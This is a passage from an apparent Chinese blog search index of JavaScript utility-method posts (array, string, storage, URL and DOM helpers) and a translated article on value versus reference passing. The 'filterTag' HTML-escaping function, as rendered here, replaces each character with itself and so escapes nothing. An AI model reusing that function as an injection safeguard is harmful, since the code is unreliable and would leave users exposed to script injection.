&#123;</span><br><span class="line">    return arr.sort( (a, b) &#x3D;&gt; &#123;</span><br><span class="line">        switch(type) &#123;</span><br><span class="line">            case 1:</span><br><span class="line">                return a - b;</span><br><span class="line">            case 2:</span><br><span class="line">                return b - a;</span><br><span class="line">            case 3:</span><br><span class="line">                return Math.random() - 0.5;</span><br><span class="line">            default:</span><br><span class="line">                return arr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*去重*&#x2F;</span><br><span class="line">unique (arr) &#123;</span><br><span class="line">    if ( Array.hasOwnProperty(&#39;from&#39;) ) &#123;</span><br><span class="line">        return Array.from(new Set(arr));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        var n &#x3D; &#123;&#125;,r&#x3D;[]; </span><br><span class="line">        for(var i &#x3D; 0; i &lt; arr.length; i++)&#123;</span><br><span class="line">            if (!n[arr[i]])&#123;</span><br><span class="line">                n[arr[i]] &#x3D; true; </span><br><span class="line">                r.push(arr[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 注：上面 else 里面的排重并不能区分 2 和 &#39;2&#39;，但能减少用indexOf带来的性能,暂时没找到替代的方法。。。</span><br><span class="line">    &#x2F;* 正确排重</span><br><span class="line">    if ( Array.hasOwnProperty(&#39;from&#39;) ) &#123;</span><br><span class="line">        return Array.from(new Set(arr))</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        var r &#x3D; [], NaNBol &#x3D; true</span><br><span class="line">        for(var i&#x3D;0; i &lt; arr.length; i++) &#123;</span><br><span class="line">            if (arr[i] !&#x3D;&#x3D; arr[i]) &#123;</span><br><span class="line">                if (NaNBol &amp;&amp; r.indexOf(arr[i]) &#x3D;&#x3D;&#x3D; -1) &#123;</span><br><span class="line">                    r.push(arr[i])</span><br><span class="line">                    NaNBol &#x3D; false</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                if(r.indexOf(arr[i]) &#x3D;&#x3D;&#x3D; -1) r.push(arr[i])</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return r</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     *&#x2F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*求两个集合的并集*&#x2F;</span><br><span class="line">union (a, b) &#123;</span><br><span class="line">    var newArr &#x3D; a.concat(b);</span><br><span class="line">    return this.unique(newArr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*求两个集合的交集*&#x2F;</span><br><span class="line">intersect (a, b) &#123;</span><br><span class="line">    var _this &#x3D; this;</span><br><span class="line">    a &#x3D; this.unique(a);</span><br><span class="line">    return this.map(a, function(o) &#123;</span><br><span class="line">        return _this.contains(b, o) ? o : null;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*删除其中一个元素*&#x2F;</span><br><span class="line">remove (arr, ele) &#123;</span><br><span class="line">    var index &#x3D; arr.indexOf(ele);</span><br><span class="line">    if(index &gt; -1) &#123;</span><br><span class="line">        arr.splice(index, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*将类数组转换为数组的方法*&#x2F;</span><br><span class="line">formArray (ary) &#123;</span><br><span class="line">    var arr &#x3D; [];</span><br><span class="line">    if(Array.isArray(ary)) &#123;</span><br><span class="line">        arr &#x3D; ary;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        arr &#x3D; Array.prototype.slice.call(ary);</span><br><span class="line">    &#125;;</span><br><span class="line">    return arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*最大值*&#x2F;</span><br><span class="line">max (arr) &#123;</span><br><span class="line">    return Math.max.apply(null, arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*最小值*&#x2F;</span><br><span class="line">min (arr) &#123;</span><br><span class="line">    return Math.min.apply(null, arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*求和*&#x2F;</span><br><span class="line">sum (arr) &#123;</span><br><span class="line">    return arr.reduce( (pre, cur) &#x3D;&gt; &#123;</span><br><span class="line">        return pre + cur</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*平均值*&#x2F;</span><br><span class="line">average (arr) &#123;</span><br><span class="line">    return this.sum(arr)&#x2F;arr.length</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript常用工具方法（4）String-字符串操作</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-%EF%BC%884%EF%BC%89String-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="4-String-字符串操作"><a href="#4-String-字符串操作" class="headerlink" title="4. String 字符串操作"></a>4. String 字符串操作</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 去除空格</span><br><span class="line"> * @param  &#123;str&#125;</span><br><span class="line"> * @param  &#123;type&#125; </span><br><span class="line"> *       type:  1-所有空格  2-前后空格  3-前空格 4-后空格</span><br><span class="line"> * @return &#123;String&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">trim (str, type) &#123;</span><br><span class="line">    type &#x3D; type || 1</span><br><span class="line">    switch (type) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            return str.replace(&#x2F;\s+&#x2F;g, &quot;&quot;);</span><br><span class="line">        case 2:</span><br><span class="line">            return str.replace(&#x2F;(^\s*)|(\s*$)&#x2F;g, &quot;&quot;);</span><br><span class="line">        case 3:</span><br><span class="line">            return str.replace(&#x2F;(^\s*)&#x2F;g, &quot;&quot;);</span><br><span class="line">        case 4:</span><br><span class="line">            return str.replace(&#x2F;(\s*$)&#x2F;g, &quot;&quot;);</span><br><span class="line">        default:</span><br><span class="line">            return str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @param  &#123;str&#125; </span><br><span class="line"> * @param  &#123;type&#125;</span><br><span class="line"> *       type:  1:首字母大写  2：首页母小写  3：大小写转换  4：全部大写  5：全部小写</span><br><span class="line"> * @return &#123;String&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">changeCase (str, type) &#123;</span><br><span class="line">    type &#x3D; type || 4</span><br><span class="line">    switch (type) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            return str.replace(&#x2F;\b\w+\b&#x2F;g, function (word) &#123;</span><br><span class="line">                return word.substring(0, 1).toUpperCase() + word.substring(1).toLowerCase();</span><br><span class="line"></span><br><span class="line">            &#125;);</span><br><span class="line">        case 2:</span><br><span class="line">            return str.replace(&#x2F;\b\w+\b&#x2F;g, function (word) &#123;</span><br><span class="line">                return word.substring(0, 1).toLowerCase() + word.substring(1).toUpperCase();</span><br><span class="line">            &#125;);</span><br><span class="line">        case 3:</span><br><span class="line">            return str.split(&#39;&#39;).map( function(word)&#123;</span><br><span class="line">                if (&#x2F;[a-z]&#x2F;.test(word)) &#123;</span><br><span class="line">                    return word.toUpperCase();</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    return word.toLowerCase()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).join(&#39;&#39;)</span><br><span class="line">        case 4:</span><br><span class="line">            return str.toUpperCase();</span><br><span class="line">        case 5:</span><br><span class="line">            return str.toLowerCase();</span><br><span class="line">        default:</span><br><span class="line">            return str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">    检测密码强度</span><br><span class="line">*&#x2F;</span><br><span class="line">checkPwd (str) &#123;</span><br><span class="line">    var Lv &#x3D; 0;</span><br><span class="line">    if (str.length &lt; 6) &#123;</span><br><span class="line">        return Lv</span><br><span class="line">    &#125;</span><br><span class="line">    if (&#x2F;[0-9]&#x2F;.test(str)) &#123;</span><br><span class="line">        Lv++</span><br><span class="line">    &#125;</span><br><span class="line">    if (&#x2F;[a-z]&#x2F;.test(str)) &#123;</span><br><span class="line">        Lv++</span><br><span class="line">    &#125;</span><br><span class="line">    if (&#x2F;[A-Z]&#x2F;.test(str)) &#123;</span><br><span class="line">        Lv++</span><br><span class="line">    &#125;</span><br><span class="line">    if (&#x2F;[\.|-|_]&#x2F;.test(str)) &#123;</span><br><span class="line">        Lv++</span><br><span class="line">    &#125;</span><br><span class="line">    return Lv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*过滤html代码(把&lt;&gt;转换)*&#x2F;</span><br><span class="line">filterTag (str) &#123;</span><br><span class="line">    str &#x3D; str.replace(&#x2F;&amp;&#x2F;ig, &quot;&amp;&quot;);</span><br><span class="line">    str &#x3D; str.replace(&#x2F;&lt;&#x2F;ig, &quot;&lt;&quot;);</span><br><span class="line">    str &#x3D; str.replace(&#x2F;&gt;&#x2F;ig, &quot;&gt;&quot;);</span><br><span class="line">    str &#x3D; str.replace(&quot; &quot;, &quot;&amp;nbsp;&quot;);</span><br><span class="line">    return str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript常用工具方法（7）Storage 储存操作</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-%EF%BC%887%EF%BC%89-Storage-%E5%82%A8%E5%AD%98%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="7-Storage-储存操作"><a href="#7-Storage-储存操作" class="headerlink" title="7. Storage 储存操作"></a>7. Storage 储存操作</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class StorageFn &#123;</span><br><span class="line">    constructor () &#123;</span><br><span class="line">        this.ls &#x3D; window.localStorage;</span><br><span class="line">        this.ss &#x3D; window.sessionStorage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*-----------------cookie---------------------*&#x2F;</span><br><span class="line">    &#x2F;*设置cookie*&#x2F;</span><br><span class="line">    setCookie (name, value, day) &#123;</span><br><span class="line">        var setting &#x3D; arguments[0];</span><br><span class="line">        if (Object.prototype.toString.call(setting).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Object&#39;)&#123;</span><br><span class="line">            for (var i in setting) &#123;</span><br><span class="line">                var oDate &#x3D; new Date();</span><br><span class="line">                oDate.setDate(oDate.getDate() + day);</span><br><span class="line">                document.cookie &#x3D; i + &#39;&#x3D;&#39; + setting[i] + &#39;;expires&#x3D;&#39; + oDate;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            var oDate &#x3D; new Date();</span><br><span class="line">            oDate.setDate(oDate.getDate() + day);</span><br><span class="line">            document.cookie &#x3D; name + &#39;&#x3D;&#39; + value + &#39;;expires&#x3D;&#39; + oDate;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*获取cookie*&#x2F;</span><br><span class="line">    getCookie (name) &#123;</span><br><span class="line">        var arr &#x3D; document.cookie.split(&#39;; &#39;);</span><br><span class="line">        for (var i &#x3D; 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">            var arr2 &#x3D; arr[i].split(&#39;&#x3D;&#39;);</span><br><span class="line">            if (arr2[0] &#x3D;&#x3D; name) &#123;</span><br><span class="line">                return arr2[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*删除cookie*&#x2F;</span><br><span class="line">    removeCookie (name) &#123;</span><br><span class="line">        this.setCookie(name, 1, -1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*-----------------localStorage---------------------*&#x2F;</span><br><span class="line">    &#x2F;*设置localStorage*&#x2F;</span><br><span class="line">    setLocal(key, val) &#123;</span><br><span class="line">        var setting &#x3D; arguments[0];</span><br><span class="line">        if (Object.prototype.toString.call(setting).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Object&#39;)&#123;</span><br><span class="line">            for(var i in setting)&#123;</span><br><span class="line">                this.ls.setItem(i, JSON.stringify(setting[i]))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            this.ls.setItem(key, JSON.stringify(val))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*获取localStorage*&#x2F;</span><br><span class="line">    getLocal(key) &#123;</span><br><span class="line">        if (key) return JSON.parse(this.ls.getItem(key))</span><br><span class="line">        return null;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*移除localStorage*&#x2F;</span><br><span class="line">    removeLocal(key) &#123;</span><br><span class="line">        this.ls.removeItem(key)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*移除所有localStorage*&#x2F;</span><br><span class="line">    clearLocal() &#123;</span><br><span class="line">        this.ls.clear()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*-----------------sessionStorage---------------------*&#x2F;</span><br><span class="line">    &#x2F;*设置sessionStorage*&#x2F;</span><br><span class="line">    setSession(key, val) &#123;</span><br><span class="line">        var setting &#x3D; arguments[0];</span><br><span class="line">        if (Object.prototype.toString.call(setting).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Object&#39;)&#123;</span><br><span class="line">            for(var i in setting)&#123;</span><br><span class="line">                this.ss.setItem(i, JSON.stringify(setting[i]))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            this.ss.setItem(key, JSON.stringify(val))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*获取sessionStorage*&#x2F;</span><br><span class="line">    getSession(key) &#123;</span><br><span class="line">        if (key) return JSON.parse(this.ss.getItem(key))</span><br><span class="line">        return null;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*移除sessionStorage*&#x2F;</span><br><span class="line">    removeSession(key) &#123;</span><br><span class="line">        this.ss.removeItem(key)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*移除所有sessionStorage*&#x2F;</span><br><span class="line">    clearSession() &#123;</span><br><span class="line">        this.ss.clear()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript常用工具方法（8）Other 其它操作</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-%EF%BC%888%EF%BC%89Other-%E5%85%B6%E5%AE%83%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="8-Other-其它操作"><a href="#8-Other-其它操作" class="headerlink" title="8. Other 其它操作"></a>8. Other 其它操作</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*获取网址参数*&#x2F;</span><br><span class="line">getURL(name)&#123;</span><br><span class="line">    var reg &#x3D; new RegExp(&quot;(^|&amp;)&quot;+ name +&quot;&#x3D;([^&amp;]*)(&amp;|$)&quot;);</span><br><span class="line">    var r &#x3D; decodeURI(window.location.search).substr(1).match(reg);</span><br><span class="line">    if(r!&#x3D;null) return  r[2]; return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*获取全部url参数,并转换成json对象*&#x2F;</span><br><span class="line">getUrlAllParams (url) &#123;</span><br><span class="line">    var url &#x3D; url ? url : window.location.href;</span><br><span class="line">    var _pa &#x3D; url.substring(url.indexOf(&#39;?&#39;) + 1),</span><br><span class="line">        _arrS &#x3D; _pa.split(&#39;&amp;&#39;),</span><br><span class="line">        _rs &#x3D; &#123;&#125;;</span><br><span class="line">    for (var i &#x3D; 0, _len &#x3D; _arrS.length; i &lt; _len; i++) &#123;</span><br><span class="line">        var pos &#x3D; _arrS[i].indexOf(&#39;&#x3D;&#39;);</span><br><span class="line">        if (pos &#x3D;&#x3D; -1) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        var name &#x3D; _arrS[i].substring(0, pos),</span><br><span class="line">            value &#x3D; window.decodeURIComponent(_arrS[i].substring(pos + 1));</span><br><span class="line">        _rs[name] &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line">    return _rs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*删除url指定参数，返回url*&#x2F;</span><br><span class="line">delParamsUrl(url, name)&#123;</span><br><span class="line">    var baseUrl &#x3D; url.split(&#39;?&#39;)[0] + &#39;?&#39;;</span><br><span class="line">    var query &#x3D; url.split(&#39;?&#39;)[1];</span><br><span class="line">    if (query.indexOf(name)&gt;-1) &#123;</span><br><span class="line">        var obj &#x3D; &#123;&#125;</span><br><span class="line">        var arr &#x3D; query.split(&quot;&amp;&quot;);</span><br><span class="line">        for (var i &#x3D; 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">            arr[i] &#x3D; arr[i].split(&quot;&#x3D;&quot;);</span><br><span class="line">            obj[arr[i][0]] &#x3D; arr[i][1];</span><br><span class="line">        &#125;;</span><br><span class="line">        delete obj[name];</span><br><span class="line">        var url &#x3D; baseUrl + JSON.stringify(obj).replace(&#x2F;[\&quot;\&#123;\&#125;]&#x2F;g,&quot;&quot;).replace(&#x2F;\:&#x2F;g,&quot;&#x3D;&quot;).replace(&#x2F;\,&#x2F;g,&quot;&amp;&quot;);</span><br><span class="line">        return url</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*获取十六进制随机颜色*&#x2F;</span><br><span class="line">getRandomColor () &#123;</span><br><span class="line">    return &#39;#&#39; + (function(h) &#123;</span><br><span class="line">        return new Array(7 - h.length).join(&quot;0&quot;) + h;</span><br><span class="line">    &#125;)((Math.random() * 0x1000000 &lt;&lt; 0).toString(16));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*图片加载*&#x2F;</span><br><span class="line">imgLoadAll(arr,callback)&#123;</span><br><span class="line">    var arrImg &#x3D; []; </span><br><span class="line">    for (var i &#x3D; 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">        var img &#x3D; new Image();</span><br><span class="line">        img.src &#x3D; arr[i];</span><br><span class="line">        img.onload &#x3D; function()&#123;</span><br><span class="line">            arrImg.push(this);</span><br><span class="line">            if (arrImg.length &#x3D;&#x3D; arr.length) &#123;</span><br><span class="line">                callback &amp;&amp; callback();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*音频加载*&#x2F;</span><br><span class="line">loadAudio(src, callback) &#123;</span><br><span class="line">    var audio &#x3D; new Audio(src);</span><br><span class="line">    audio.onloadedmetadata &#x3D; callback;</span><br><span class="line">    audio.src &#x3D; src;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*DOM转字符串*&#x2F;</span><br><span class="line">domToStirng(htmlDOM)&#123;</span><br><span class="line">    var div&#x3D; document.createElement(&quot;div&quot;);</span><br><span class="line">    div.appendChild(htmlDOM);</span><br><span class="line">    return div.innerHTML</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*字符串转DOM*&#x2F;</span><br><span class="line">stringToDom(htmlString)&#123;</span><br><span class="line">    var div&#x3D; document.createElement(&quot;div&quot;);</span><br><span class="line">    div.innerHTML&#x3D;htmlString;</span><br><span class="line">    return div.children[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 光标所在位置插入字符，并设置光标位置</span><br><span class="line"> * </span><br><span class="line"> * @param &#123;dom&#125; 输入框</span><br><span class="line"> * @param &#123;val&#125; 插入的值</span><br><span class="line"> * @param &#123;posLen&#125; 光标位置处在 插入的值的哪个位置</span><br><span class="line"> *&#x2F;</span><br><span class="line">setCursorPosition (dom,val,posLen) &#123;</span><br><span class="line">    var cursorPosition &#x3D; 0;</span><br><span class="line">    if(dom.selectionStart)&#123;</span><br><span class="line">        cursorPosition &#x3D; dom.selectionStart;</span><br><span class="line">    &#125;</span><br><span class="line">    this.insertAtCursor(dom,val);</span><br><span class="line">    dom.focus();</span><br><span class="line">    console.log(posLen)</span><br><span class="line">    dom.setSelectionRange(dom.value.length,cursorPosition + (posLen || val.length));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*光标所在位置插入字符*&#x2F;</span><br><span class="line">insertAtCursor(dom, val) &#123;</span><br><span class="line">    if (document.selection)&#123;</span><br><span class="line">        dom.focus();</span><br><span class="line">        sel &#x3D; document.selection.createRange();</span><br><span class="line">        sel.text &#x3D; val;</span><br><span class="line">        sel.select();</span><br><span class="line">    &#125;else if (dom.selectionStart || dom.selectionStart &#x3D;&#x3D; &#39;0&#39;)&#123;</span><br><span class="line">        let startPos &#x3D; dom.selectionStart;</span><br><span class="line">        let endPos &#x3D; dom.selectionEnd;</span><br><span class="line">        let restoreTop &#x3D; dom.scrollTop;</span><br><span class="line">        dom.value &#x3D; dom.value.substring(0, startPos) + val + dom.value.substring(endPos, dom.value.length);</span><br><span class="line">        if (restoreTop &gt; 0)&#123;</span><br><span class="line">            dom.scrollTop &#x3D; restoreTop;</span><br><span class="line">        &#125;</span><br><span class="line">        dom.focus();</span><br><span class="line">        dom.selectionStart &#x3D; startPos + val.length;</span><br><span class="line">        dom.selectionEnd &#x3D; startPos + val.length;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        dom.value +&#x3D; val;</span><br><span class="line">        dom.focus();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript的值传递和引用传递</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E7%9A%84%E5%80%BC%E4%BC%A0%E9%80%92%E5%92%8C%E5%BC%95%E7%94%A8%E4%BC%A0%E9%80%92/</url>
    <content><![CDATA[<ul>
<li>  原文: <a href="https://codeburst.io/explaining-value-vs-reference-in-javascript-647a975e12a0">Explaining Value vs. Reference in Javascript</a></li>
</ul>
<p><strong>为了保证可读性，本文采用意译而非直译。另外，本文版权归原作者所有，翻译仅用于学习。</strong></p>
<p>JavaScript有5种基本的数据类型，分别是：布尔、null、undefined、String和Number。这些基本类型在赋值的时候是通过值传递的方式。值得注意的是还有另外三种类型: Array、Function和Object，它们通过引用来传递。从底层技术上看，它们三都是对象。</p>
<h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><p>如果一个基本的数据类型绑定到某个变量，我们可以认为该变量包含这个基本数据类型的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10;</span><br><span class="line">var y &#x3D; &#39;abc&#39;;</span><br><span class="line">var z &#x3D; null;</span><br></pre></td></tr></table></figure>
<p>当我们使用<code>=</code>将这些变量赋值到另外的变量，实际上是将对应的值拷贝了一份，然后赋值给新的变量。我们把它称作<code>值传递</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10;</span><br><span class="line">var y &#x3D; &#39;abc&#39;;</span><br><span class="line"></span><br><span class="line">var a &#x3D; x;</span><br><span class="line">var b &#x3D; y;</span><br><span class="line"></span><br><span class="line">console.log(x, y, a, b) &#x2F;&#x2F; 10, &#39;abc&#39;, 10, &#39;abc&#39;</span><br></pre></td></tr></table></figure>
<p><code>a</code>和<code>x</code>都包含10，<code>b</code>和<code>y</code>都包含<code>&#39;abc&#39;</code>，并且它们是完全独立的拷贝，互不干涉。如果我们将<code>a</code>的值改变，<code>x</code>不会受到影响。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10;</span><br><span class="line">var y &#x3D; &#39;abc&#39;;</span><br><span class="line">var a &#x3D; x;</span><br><span class="line">var b &#x3D; y;</span><br><span class="line">a &#x3D; 5;</span><br><span class="line">b &#x3D; &#39;def&#39;;</span><br><span class="line">console.log(x, y, a, b); &#x2F;&#x2F; 10, &#39;abc&#39;, 5, &#39;def&#39;</span><br></pre></td></tr></table></figure>
<p>###对象</p>
<p>如果一个变量绑定到一个非基本数据类型(Array, Function, Object)，那么它只记录了一个内存地址，该地址存放了具体的数据。注意之前提到指向基本数据类型的变量相当于包含了数据，而现在指向非基本数据类型的变量本身是不包含数据的。</p>
<p>对象在内存中被创建，当我们声明<code>arr = []</code>，我们在内存中创建了一个数组。<code>arr</code>记录的是该内存的地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr &#x3D; []; &#x2F;&#x2F; (a)</span><br><span class="line">arr.push(1); &#x2F;&#x2F; (b)</span><br></pre></td></tr></table></figure>

<p>当执行完(a)之后，内存中创建了一个空的数组对象，其内存地址为<code>#001</code>，<code>arr</code>指向该地址。</p>
<table>
<thead>
<tr>
<th>变量</th>
<th>地址</th>
<th>对象</th>
</tr>
</thead>
<tbody><tr>
<td>arr</td>
<td>#001</td>
<td>[]</td>
</tr>
</tbody></table>
<p>当执行完(b)之后，数组对象中多了一个元素，但是数组的地址依然没有变，<code>arr</code>也没有变。</p>
<table>
<thead>
<tr>
<th>变量</th>
<th>地址</th>
<th>对象</th>
</tr>
</thead>
<tbody><tr>
<td>arr</td>
<td>#001</td>
<td>[1]</td>
</tr>
</tbody></table>
<h3 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h3><p>对象是通过引用传递，而不是值传递。也就是说，变量赋值只会将地址传递过去。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reference &#x3D; [1];</span><br><span class="line">var refCopy &#x3D; reference;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>变量</th>
<th>地址</th>
<th>对象</th>
</tr>
</thead>
<tbody><tr>
<td>reference</td>
<td>#001</td>
<td>[1]</td>
</tr>
<tr>
<td>refCopy</td>
<td>#001</td>
<td></td>
</tr>
</tbody></table>
<p><code>reference</code>和<code>refCopy</code>指向同一个数组。 如果我们更新<code>reference</code>，<code>refCopy</code>也会受到影响。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reference.push(2);</span><br><span class="line">console.log(reference, refCopy); &#x2F;&#x2F; [1, 2], [1, 2]</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>变量</th>
<th>地址</th>
<th>对象</th>
</tr>
</thead>
<tbody><tr>
<td>reference</td>
<td>#001</td>
<td>[1, 2]</td>
</tr>
<tr>
<td>refCopy</td>
<td>#001</td>
<td></td>
</tr>
</tbody></table>
<p>###引用重新赋值</p>
<p>如果我们将一个已经赋值的变量重新赋值，那么它将包含新的数据或则引用地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj &#x3D; &#123; first: &#39;fundebug.com&#39;&#125;;</span><br><span class="line">obj &#x3D; &#123; second: &#39;fundebug.cn&#39;&#125;;</span><br></pre></td></tr></table></figure>

<p><code>obj</code>从指向第一个对象变为指向第二个对象。</p>
<table>
<thead>
<tr>
<th>变量</th>
<th>地址</th>
<th>对象</th>
</tr>
</thead>
<tbody><tr>
<td>obj</td>
<td>#001</td>
<td>{first: ‘fundebug.com’}</td>
</tr>
<tr>
<td></td>
<td>#002</td>
<td>{second: ‘fundebug.cn’}</td>
</tr>
</tbody></table>
<p>如果一个对象没有被任何变量指向，就如第一个对象(地址为<code>#001</code>)，JavaScript引擎的垃圾回收机制会将该对象销毁并释放内存。</p>
<p>###== 和 ===</p>
<p>对于引用类型的变量，<code>==</code>和<code>===</code>只会判断引用的地址是否相同，而不会判断对象具体里属性以及值是否相同。因此，如果两个变量指向相同的对象，则返回<code>true</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arrRef &#x3D; [&#39;Hi!&#39;];</span><br><span class="line">var arrRef2 &#x3D; arrRef;</span><br><span class="line"></span><br><span class="line">console.log(arrRef &#x3D;&#x3D;&#x3D; arrRef2); &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>
<p>如果是不同的对象，即使包含相同的属性和值，也会返回<code>false</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr1 &#x3D; [&quot;Hi!&quot;];</span><br><span class="line">var arr2 &#x3D; [&quot;Hi!&quot;];</span><br><span class="line"></span><br><span class="line">console.log(arr1 &#x3D;&#x3D;&#x3D; arr2); &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>
